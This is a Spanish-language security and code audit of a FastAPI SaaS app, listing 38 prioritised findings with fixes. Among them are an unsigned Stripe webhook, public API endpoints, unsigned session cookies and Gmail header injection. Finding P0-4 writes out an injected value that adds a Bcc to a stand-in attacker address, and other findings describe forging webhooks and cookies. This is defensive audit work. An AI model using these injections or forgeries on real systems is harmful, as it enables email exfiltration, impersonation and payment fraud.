# Auditoría — NUMA POMPILIU (SaaS FastAPI)

Fecha: 2026-06-07
Alcance auditado: `backend/*.py` (1 → 1495 LOC server, auth, stripe, gmail, rag, middleware, db, llm, enums) y `frontend/index.html`, `index.es.html`, `capture.html`.
Total hallazgos: 38.

---

## P0 — Crítico (parar la línea)

### P0-1. Webhook Stripe acepta payloads sin firma cuando falta el secret
- Archivo: `backend/stripe_integration.py` líneas ~312-332
- Problema: si `STRIPE_WEBHOOK_SECRET` está vacío, el handler parsea el JSON crudo y lo trata como evento válido. Cualquiera puede POSTear un `checkout.session.completed` falso con `metadata.session_id` y `product_key` y obtener acceso al informe sin pagar.
- Fix: si no hay secret → devolver 503 (servicio mal configurado), no aceptar el evento.

### P0-2. Todos los endpoints `/api/` son públicos sin auth
- Archivo: `backend/server.py` líneas 232-248 (especialmente 240-241)
- Problema: el middleware deja pasar TODO `/api/*` con el comentario "auth via network isolation". El servidor escucha `0.0.0.0:8765` (línea 1489). En producción, esto expone CRUD completo: borrar índice RAG, listar sesiones, leer entrevistas de otros expertos, crear entidades.
- Fix: gating real por cookie de sesión (`get_session_user`) en endpoints sensibles, no por "LAN".

### P0-3. `NUMA_SESSION_SECRET` vacío → cookies de sesión sin firmar
- Archivo: `backend/auth.py` líneas 24, 131-136, 165-171
- Problema: si la env var no está, `_set_session_cookie` guarda el payload como JSON plano y `get_session_user` lo lee igual. Cualquiera fabrica `{"sub":"...", "email":"victim@x"}` y suplanta usuarios — incluido el token de Gmail.
- Fix: hacer falla dura al arrancar si no hay secret (raise en `setup_auth`), no degradar a inseguro.

### P0-4. Gmail header injection en `_build_message`
- Archivo: `backend/gmail_client.py` líneas 119-131 (también 308-309)
- Problema: el RFC822 se construye con `f"Subject: {subject}"` sin escapar CRLF. Un `statement` con `\nBcc: attacker@evil.com` se manda como header adicional. `save_knowledge_as_draft` toma `statement` del usuario y lo pone en `subject` (línea 306) → vector vivo.
- Fix: usar `email.message.EmailMessage` o validar/strippear `\r\n` en todos los headers antes de concatenar.

### P0-5. `buyReport` usa un session_id sintético sin relación con NUMA
- Archivo: `frontend/index.html` líneas 1164-1166 (idem en `index.es.html`)
- Problema: `sessionId = 'anon-' + Date.now()` se manda a Stripe Checkout y se persiste como clave de purchase. El `success_url = /report/{session_id}` no existe (no hay endpoint `/report/...` en `server.py`) y no hay forma de mapear ese pago a una sesión NUMA real. El cliente paga 9-39€ y no recibe nada.
- Fix: bloquear `buyReport` hasta tener `session_id` real (post-login + post-entrevista) y crear el endpoint `/report/{session_id}` que valide con `check_report_access`.

### P0-6. No existe el endpoint `/report/{session_id}` que entrega el producto pagado
- Archivo: `backend/server.py` (ausente) + `backend/stripe_integration.py` línea 379
- Problema: `check_report_access(session_id)` se exporta pero nadie lo llama. `success_url` apunta a `/report/{session_id}` que cae en el catch-all SPA y devuelve `index.html`. El producto vendido no se entrega.
- Fix: implementar `GET /report/{session_id}` que llame `check_report_access` y devuelva 402 si no hay pago, JSON/PDF si lo hay.

### P0-7. `POST /api/rag/reindex/all` borra ChromaDB sin auth ni confirmación
- Archivo: `backend/server.py` líneas 1389-1414
- Problema: `shutil.rmtree(ch_dir)` sobre el índice completo, vía endpoint `/api/` público (ver P0-2). Un curl anónimo destruye horas de embeddings.
- Fix: exigir `Depends(require_auth)` + rol admin + cabecera de confirmación (`X-Confirm-Destroy: yes`).

---

## P1 — Importante (afecta seguridad, robustez o ingresos)

### P1-1. Webhook Stripe sin idempotencia
- `backend/stripe_integration.py` líneas 293-373
- Problema: Stripe reenvía eventos en fallos transitorios. `_record_purchase` sobreescribe sin chequear `event.id`. No causa doble cobro pero corrompe timestamps.
- Fix: mantener set/tabla de `processed_event_ids` y descartar duplicados.

### P1-2. Race condition en `stripe_purchases.json`
- `backend/stripe_integration.py` líneas 86-124
- Problema: load+modify+save sin lock. Dos webhooks concurrentes pierden uno.
- Fix: `fcntl.flock` sobre el fichero o, mejor, mover a la tabla SQLite que ya existe.

### P1-3. CORS wildcard por defecto
- `backend/server.py` líneas 253-261
- Problema: `NUMA_CORS_ORIGINS="*"` por defecto. Aunque `allow_credentials=False` mitiga el robo de cookies, sigue dejando que cualquier sitio invoque endpoints públicos como `/api/sessions`.
- Fix: default a `[]` (no CORS); exigir lista explícita.

### P1-4. Gmail tokens viajan dentro del JWT de sesión
- `backend/auth.py` líneas 222-244
- Problema: `access_token` y `refresh_token` de Google se incrustan en la cookie. El JWT crece, viaja en cada request, y cualquier XSS de un origen confiable expone el refresh_token.
- Fix: almacenar tokens server-side (tabla `oauth_tokens` ligada a `sub`) y guardar solo el `sub` en la cookie.

### P1-5. `samesite=lax` para una cookie con scope OAuth/Gmail
- `backend/auth.py` líneas 137-144
- Problema: `lax` permite navegación cross-site GET. Para una cookie que custodia acceso a Gmail, `strict` es lo correcto.
- Fix: `samesite="strict"` para `numa_session`.

### P1-6. `serve_frontend` sirve `index.html` como fallback con `open()` sin cierre
- `backend/server.py` líneas 1440, 1481
- Problema: `open(path).read()` no usa context manager y devuelve HTMLResponse sincrono (bloquea el loop). En caliente filtra descriptores; en frío bloquea I/O.
- Fix: `FileResponse(...)` para ambos casos o `async with aiofiles.open(...)`.

### P1-7. `PAPER_DIR` apunta a `../../../paper` fuera del proyecto
- `backend/server.py` línea 1422
- Problema: tres niveles arriba del backend. Depende del layout local del autor. En contenedor o despliegue limpio, los PDFs no existen.
- Fix: env var `NUMA_PAPER_DIR` con default `./paper` dentro del repo.

### P1-8. Commit prematuro + LLM bloqueante en `submit_answer`
- `backend/server.py` líneas 416-444, 534
- Problema: se hace `db.commit()` de la respuesta del usuario, luego `await analyze_answer` (LLM, hasta 60s) y `await index_knowledge_items` (HTTP a un RAG externo, 30s). El cliente espera y, si peta el LLM, los items quedan sin extraer pero la respuesta sí guardada — inconsistente y lento.
- Fix: encolar análisis y reindex en background (`BackgroundTasks`/queue) y responder al cliente con la siguiente pregunta inmediatamente.

### P1-9. `Phase("")` revienta cuando `current_phase` está vacío
- `backend/server.py` línea 585
- Problema: `PHASE_ORDER[: PHASE_ORDER.index(Phase(session.current_phase)) + 1]` lanza `ValueError` si el campo está vacío o es un valor no enum (p.ej. en sesiones legacy).
- Fix: `if session.current_phase in {"A","B","C","D","E"}` antes del cálculo.

### P1-10. `O(n²)` en `/api/comparativa` sin paginación ni cache
- `backend/server.py` líneas 875-1148
- Problema: triple bucle sobre todos los knowledge items de todas las sesiones (`all_items_flat × all_items_flat`). Con 200 items × 50 sesiones se pasa segundos en CPU.
- Fix: precalcular embeddings o índice invertido por palabra, o limitar a N sesiones recientes.

### P1-11. Copy frontend miente sobre la auth y los datos
- `frontend/index.html` línea 1020 ("No registration required · Data stored locally")
- Problema: `/capture` redirige a Google OAuth (server.py:1446-1450), y los datos van a una BBDD SQLite y embeddings remotos. Mensaje engañoso.
- Fix: cambiar a "Google login required · Data stored on our servers" / "Inicio de sesión con Google · Datos en nuestros servidores".

### P1-12. Accesibilidad mínima en landing
- `frontend/index.html` y `index.es.html`
- Problema: botones `<button onclick=...>` sin `type="button"`, SVGs decorativos sin `aria-hidden`, sin `skip-to-content`, contraste `--text-dim:#6B7488` sobre `--bg:#0A0E1A` borderline AA, foco no marcado en `.nav-cta`.
- Fix: añadir `aria-hidden="true"` a SVGs decorativos, `:focus-visible` con outline dorado, link skip al hero, subir `--text-dim` a `#8A93A8`.

### P1-13. Rate limiter sin purga + sin lock
- `backend/middleware.py` líneas 56-87
- Problema: `_buckets` crece indefinidamente (cada IP nueva queda viva para siempre). Memoria leak lenta. Tampoco está protegido entre workers (con `--workers > 1` cada uno lleva su contador).
- Fix: purgar buckets vacíos al final de `check`, o moverlo a Redis si hay >1 worker.

### P1-14. `/api/shadow/stats` carga TODO `ShadowEntry` en memoria
- `backend/server.py` líneas 703-726
- Problema: `select(ShadowEntry)` sin límite + sort en Python. Con 10k entries, lento y caro.
- Fix: agregar con SQL (`func.count`, `func.date`) y `order_by(...).limit(10)` para `latest`.

### P1-15. Re-fetch frágil de IDs por orden DESC
- `backend/server.py` líneas 446-460
- Problema: para reasignar IDs Chroma se hace `order_by(KnowledgeItem.id.desc()).limit(len(chroma_items))` asumiendo orden de inserción. Si dos requests concurren sobre la misma sesión, mezcla IDs de otra petición.
- Fix: capturar `entity.id` por cada `db.add(...)` haciendo `db.flush()` y usando el id inmediatamente.

### P1-16. Stripe `stripe.api_key` se reasigna por handler
- `backend/stripe_integration.py` líneas 235, 306
- Problema: en cada request. Funciona, pero indica que no se inicializa en `setup_stripe`. Si dos endpoints corren en paralelo con diferentes keys → race.
- Fix: setear una vez en `setup_stripe`.

### P1-17. Versión EN sirve mediante Host header sin firma
- `backend/server.py` líneas 1436-1440
- Problema: `host = request.headers.get("host")` decide qué HTML servir. Tras un proxy mal configurado el Host puede ser cualquier cosa. Menor pero invisible al equipo SEO.
- Fix: routing explícito por path (`/es`, `/en`) o por subdominio validado.

---

## P2 — Mejora (deuda técnica y quick wins)

### P2-1. Email en footer expuesto a scrapers
- `frontend/index.html` y `index.es.html` línea 1108
- Fix: ofuscar con JS o sustituir por formulario de contacto.

### P2-2. Ficheros `.bak` en `frontend/`
- `frontend/index.html.bak`, `frontend/index.es.html.bak`
- Fix: borrar y añadir `*.bak` al `.gitignore`.

### P2-3. `class StartRequest(BaseModel): pass` fuerza body vacío
- `backend/server.py` líneas 73-74, 362-366
- Fix: aceptar también `POST` sin body (`Body(default=None)`).

### P2-4. `_index_items_to_chroma` carga el modelo en el primer hit
- `backend/server.py` líneas 136-162
- Problema: la primera petición de RAG paga el coste de cargar `SentenceTransformer` (~3-5s). UX feo.
- Fix: precargar en `lifespan` (línea 199) en lugar del no-op actual (`_rag_collection` solo).

### P2-5. `analyze_answer` falla silenciosamente con JSON malformado
- `backend/llm.py` líneas 284-291
- Problema: el LLM responde a menudo con ```json ... ``` o texto explicativo. `json.loads` peta y se descartan los items.
- Fix: extraer JSON con regex/`json.loads` tras strip de fences, o usar response format estructurado del LLM.

### P2-6. `get_message_body` solo decodifica `text/plain` raíz
- `backend/gmail_client.py` líneas 451-462
- Problema: mails multipart anidados (text/html + text/plain dentro de `multipart/alternative` dentro de `multipart/mixed`) no se recorren recursivamente. RAG pierde contenido.
- Fix: walk recursivo de `parts` (BFS) buscando `text/plain`.

### P2-7. `search_gmail` N+1 sobre `messages.get`
- `backend/gmail_client.py` líneas 380-407
- Problema: por cada hit en `messages.list`, un `messages.get` extra (50 hits → 51 llamadas). Lento y cuenta cuota.
- Fix: usar `batchHttpRequest` o solo `list` con `fields=messages(id,threadId,snippet,labelIds,internalDate)` (no soportado todavía en `list`, alternativa: solo devolver lo de `list` sin snippet).

### P2-8. `create_or_get_label` lista todas las labels cada vez
- `backend/gmail_client.py` líneas 202-225 y se invoca 2× en `save_knowledge_as_draft`
- Fix: cachear `{name: id}` en memoria por `sub`.

### P2-9. `rag_integration.py` duplica función con `_index_items_to_chroma`
- `backend/rag_integration.py` + `backend/server.py` líneas 165-196
- Problema: dos rutas de indexado (HTTP externo y local Chroma) llamadas la una tras la otra al completar (server.py:521-536). El externo seguramente está muerto: la URL default `localhost:9191` no la sirve nada.
- Fix: matar `rag_integration.py` o flag `NUMA_RAG_REMOTE=true` para activar.

### P2-10. CSP `'unsafe-inline'` en scripts y estilos
- `backend/middleware.py` líneas 30-41
- Problema: el frontend usa `onclick=...`, `<style>` inline y `<script>` inline en abundancia, así que la CSP está casi neutralizada. Defensa contra XSS reducida.
- Fix: mover JS/CSS a ficheros externos y usar nonce/sha256 en CSP.

### P2-11. `lifespan` no precarga el modelo de embeddings
- `backend/server.py` línea 204
- Problema: `_rag_collection` por sí solo no hace nada (es la variable global). La línea es no-op.
- Fix: llamar `_load_rag()` para warm-up.

### P2-12. `init_db_sync` duplica engine
- `backend/database.py` líneas 242-249
- Problema: convive con el async. Riesgo de drift de esquema si solo se usa uno en tests.
- Fix: borrar la versión sync si nadie la usa, o exportar `Base.metadata` y crear engine en tests.

### P2-13. Mensajes de sistema en español hard-coded en LLM
- `backend/llm.py` líneas 44-159
- Problema: el copy de las cinco fases (texto que los usuarios leen) está en español dentro del código. La versión EN del producto no podrá nunca cambiar de idioma sin tocar el backend.
- Fix: extraer a JSON/YAML por idioma, o hacer plantillas parametrizadas por `lang`.

### P2-14. Catch genérico `except Exception` en 12+ sitios sin re-raise
- `backend/server.py` líneas 192, 459, 462, 533, 683
- Problema: cualquier bug (incluyendo SQL fail) queda enterrado bajo `logger.warning`. Errores invisibles.
- Fix: catch específicos (`SQLAlchemyError`, `httpx.RequestError`, `chromadb.errors.*`) y dejar caer el resto.

---

## Top-5 fuegos para hoy

1. **Cerrar el agujero del webhook Stripe** (P0-1): exigir `STRIPE_WEBHOOK_SECRET` siempre. Sin él, devolver 503. **Bloquea fraude de un POST.**
2. **Implementar `/report/{session_id}` y arreglar `buyReport`** (P0-5 + P0-6): hoy un cliente paga 9-39€ y no recibe nada. Hasta arreglarlo, **desactivar los botones de pricing en el frontend**.
3. **Quitar el "todos los `/api/` son públicos"** (P0-2): cambiar el bypass de `/api/` en `auth_middleware` por gating real con `get_session_user`. Mínimo proteger `/api/rag/reindex*`, `/api/sessions/{id}`, `/api/comparativa`.
4. **Forzar `NUMA_SESSION_SECRET`** (P0-3): `raise RuntimeError` en arranque si está vacío. No hay "modo dev seguro" sin firma.
5. **Sanear el RFC822 de Gmail** (P0-4): usar `email.message.EmailMessage` o, mínimo, `re.sub(r"[\r\n]", "", value)` sobre `to`, `subject` y `sender` antes de concatenar. **Hoy una entrevista permite Bcc-out a un atacante.**

---

_Informe generado sin modificar código. 38 hallazgos documentados (P0: 7 · P1: 17 · P2: 14)._
